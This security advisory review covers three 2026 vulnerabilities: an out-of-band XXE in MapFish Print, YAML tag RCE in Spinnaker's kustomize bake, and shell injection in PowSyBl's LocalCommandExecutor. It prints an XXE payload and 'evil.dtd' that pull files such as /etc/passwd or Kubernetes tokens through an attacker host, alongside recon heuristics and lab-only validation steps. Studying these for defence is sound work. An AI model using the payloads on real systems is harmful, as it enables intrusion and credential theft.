# MapFish Print 404-reflected XXE, Spinnaker kustomize-bake YAML tags, and PowSyBl local command…

**Date reviewed:** 2026-08-30
**Primary advisories:** [GHSA-5v29-34h8-v68r / CVE-2026-55848](https://github.com/advisories/GHSA-5v29-34h8-v68r) (high, 8.6), MapFish Print; [GHSA-p68j-q7hf-3qcp](https://github.com/advisories/GHSA-p68j-q7hf-3qcp) (high, 7.5), Spinnaker RO SCO; [GHSA-jqvf-j3ww-r8c7](https://github.com/advisories/GHSA-jqvf-j3ww-r8c7) (high), PowSyBl Core.
**Boundary class:** untrusted content crossing into parse → compile/execute pipelines inside build/render/analysis services, XML entity expansion on an error path, YAML tag handling during kustomize bake, and shell construction from `List<String>` arguments in a Java computation library.

## 1. MapFish Print: 404-reflected OOB XXE against GML layer URLs

MapFish Print fetches a GML layer URL supplied in the print request. The XXE is reachable through the **error path**: when the layer URL 404s, the server expands the entity and throws a default 404 whose response body includes the *full resolved path*, including the OOB entity payload. The result is an out-of-band XXE that reads arbitrary files of certain types (e.g. `/etc/passwd`, Kubernetes service-account tokens and certs) on `print-lib` / `print-servlet` `>= 3.0.0, < 3.28.30` and `>= 3.29.0, < 3.30.32`.

The reusable pattern:

1. Attacker hosts a small XML file (a PHP/any-language endpoint that echoes `<!DOCTYPE x [<!ENTITY % payload SYSTEM "file://<target-path>"> <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"> %dtd;]>` plus a `wfs:FeatureCollection` wrapper).
2. Attacker hosts `evil.dtd`: `<!ENTITY % exfil "<!ENTITY &#37; error SYSTEM 'file:///xxe-exfil/%payload;'>"> %exfil; %error;`
3. A single print request with the attacker XML URL as the GML layer URL.
4. The 404 handler's "file not found: `<expanded path>`" error reflects the exfiltrated content back, and the `file:///xxe-exfil/...` OOB request confirms the primitive without needing the reflected body at all.

Recon heuristic: any server-side XML/GML/GeoJSON/WFS fetcher is an XXE candidate. Test the **error paths** specifically, a `DOCTYPE`-enabled parser that swallows the normal response often still echoes the entity-expanded value inside its 404/500 body. If the product accepts a remote URL for *any* geospatial layer, image source, or report template, the layer URL is the input.

## 2. Spinnaker RO SCO: unsafe YAML tag processing during kustomize bake → pod RCE

RO SCO's kustomize-bake operations process image tags unsafely, which leads to RCE-type exploits on the rosco pods, **only when kustomize is the bake provider**. The advisory's own guidance is to block kustomize operations and use another provider, which is the operational mitigation but also the operator-side check: is kustomize bake enabled on this cluster?

Affected: `rosco-manifests` `< 2025.3.4`, `>= 2025.4.0, < 2025.4.4`, `>= 2026.0.0, < 2026.0.3`.

Recon heuristic: Spinnaker deployments that expose pipeline definitions to non-admins (or where a pipeline-definition write is part of the bug-hunt scope) should enumerate which bake providers are enabled. A kustomize-bake-enabled RO SCO with user-controlled pipeline inputs is the pre-condition; the YAML tag boundary is the trigger.

## 3. PowSyBl Core: `LocalCommandExecutor` shell construction from `List<String>` arguments

Both OS-dependent implementations of `AbstractLocalCommandExecutor` (CWE-78) build command strings via concatenation and execute them through `bash -c` (Unix) or `cmd /c` (Windows). Any string argument or environment-variable value reaching the executor breaks out of the intended command and executes arbitrary shell code as the JVM user. The sink is reachable through **public APIs that accept `List<String>` arguments** with no documented shell-interpretation semantics, the secondary concern is CWE-88 argument injection via environment variables.

Affected: `com.powsybl:powsybl-computation-local` `<= 7.2.1`, fixed in 7.2.2.

Recon heuristic: PowSyBl is a power-system analysis library; the offensive angle is any product that embeds it and feeds user-influenced data (network model identifiers, external-software arguments, solver option names) into its computation-local executor. Enumerate the public `List<String>`-accepting entry points in dependent products and check whether any argument position reaches `LocalCommandExecutor`.

## Replayable validation (lab only)

### MapFish Print 404-reflected XXE

Preconditions: a lab MapFish Print `3.x` in the affected range, an owned callback host (or local HTTP server) for the XML + DTD, and a readable canary file (e.g. a file the service user can read, placed at a known path; on a Kubernetes lab pod, `/var/run/secrets/kubernetes.io/serviceaccount/token` is the documented target, do not use it outside authorized scope).

1. Host the XML endpoint and `evil.dtd` on the owned callback host.
2. Baseline: a print request with a non-XML GML URL → normal error, no entity expansion.
3. Send the print request with the GML layer URL set to the attacker XML endpoint with the target file path attached.
4. Positive: the callback host receives the OOB `file:///xxe-exfil/<canary-content>` request, **or** the 404 response body reflects the expanded path containing the canary. Stop at the canary file, do not read credentials, real secrets, or data beyond the canary.
5. Negative control on 3.28.30 / 3.30.32: the DOCTYPE is rejected or the error path no longer reflects.

### Spinnaker kustomize bake

Preconditions: a lab Spinnaker cluster with RO SCO and kustomize bake enabled, a pipeline-definition write path available to the test identity.

1. Confirm kustomize is the active bake provider (config inspection or a benign bake with a known-good kustomization).
2. Craft a pipeline input that places a canary YAML tag into the image-reference position the advisory identifies; execute the bake in the lab namespace.
3. Positive: the rosco pod executes the tag-embedded instruction (canary marker only). No production cluster, no image pull to external registries, no container escape.
4. Negative control: patched `rosco-manifests` rejects the same input; or kustomize disabled → bake falls to a safe provider.

### PowSyBl local command executor

Preconditions: a JVM lab with `powsybl-computation-local` 7.2.1 on the classpath and direct API access (this is a library-level finding; validation is code-level plus a benign process marker).

1. Call a public `List<String>`-accepting entry point with an argument containing a shell-breakout marker (e.g. an argument that would create a marker file via `bash -c` semantics).
2. Positive: the marker appears where the JVM user can write, proving shell interpretation of `List<String>` elements. No real command execution beyond the marker.
3. Negative control on 7.2.2: the same input is either escaped or the API no longer reaches a shell.
4. Record the exact public API, the argument position, and the OS (`bash -c` vs `cmd /c` path) in the report.

## Safe boundaries

- Lab deployments only, exact product versions pinned for the negative control.
- XXE proofs stop at a canary file and the OOB callback; no credential, secret, or tenant-data reads.
- Spinnaker validation in an isolated lab namespace only; no production pipeline execution, no external registry pulls, no container/host escape.
- PowSyBl validation at the marker-file level only; no real system commands, no environment-variable exfiltration.
- All evidence synthetic and redacted; report the exact input-to-parse-to-execute path with the denied/escaped control.

## Sources

- [GitHub Advisory Database: MapFish Print GHSA-5v29-34h8-v68r / CVE-2026-55848](https://github.com/advisories/GHSA-5v29-34h8-v68r), 404-reflected OOB XXE via GML layer URL
- [GitHub Advisory Database: Spinnaker GHSA-p68j-q7hf-3qcp](https://github.com/advisories/GHSA-p68j-q7hf-3qcp), unsafe YAML tag processing on kustomize bake operations
- [GitHub Advisory Database: PowSyBl GHSA-jqvf-j3ww-r8c7](https://github.com/advisories/GHSA-jqvf-j3ww-r8c7), `LocalCommandExecutor` command/argument injection
